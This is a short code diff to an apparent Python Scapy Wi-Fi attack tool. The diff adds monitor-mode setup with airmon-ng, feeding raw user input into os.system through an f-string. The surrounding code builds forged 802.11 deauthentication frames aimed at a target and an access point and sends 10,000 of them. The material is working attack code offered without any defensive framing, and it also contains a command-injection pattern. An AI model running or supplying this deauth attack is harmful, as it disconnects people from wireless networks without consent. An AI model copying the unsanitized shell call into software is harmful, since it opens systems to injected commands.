@@ -35,6 +35,10 @@ def PacketHandler(pkt):
         networks.loc[bssid] = (ssid, channel)
 
 
+os.system("iwconfig")
+INTERFACE = input("please enter your network interface name:\n")
+os.system(f"sudo airmon-ng start {INTERFACE}")
+os.system("sudo ifconfig wlan0mon up")
 print("networks scan in progress , please wait...")
 sniff(iface="wlan0mon", count=300, prn=PacketHandler)
 
@@ -65,4 +69,3 @@ print("target -- AP")
 pkt = RadioTap()/ Dot11( addr1 = brdmac , addr2 = target ,addr3= AP ) / Dot11Deauth()
 
 sendp(pkt , iface = "wlan0mon" , count = 10000 , inter = .2)
-
